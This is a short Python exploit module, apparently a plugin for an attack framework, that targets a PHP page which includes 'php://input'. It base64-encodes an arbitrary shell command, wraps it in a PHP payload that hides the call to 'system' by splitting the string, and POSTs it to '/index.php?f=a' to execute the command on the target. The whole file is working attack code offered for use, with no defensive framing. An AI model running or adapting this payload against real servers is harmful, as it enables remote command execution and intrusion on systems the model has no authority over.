#!/usr/bin/env python

from framework.http import http
from framework.config import *
from framework.function import *
import urllib
import traceback

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    include "php://input";

    '''
    
    try:           
        cmd = urllib.unquote(cmd) 
        cmd = base64.b64encode(cmd)
        data = "<?php $a='sy'.'stem';$b = '%s';$a(base64_decode($b));?>"%cmd
        res = http("post",target,target_port,"/index.php?f=a",data,headers)
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res




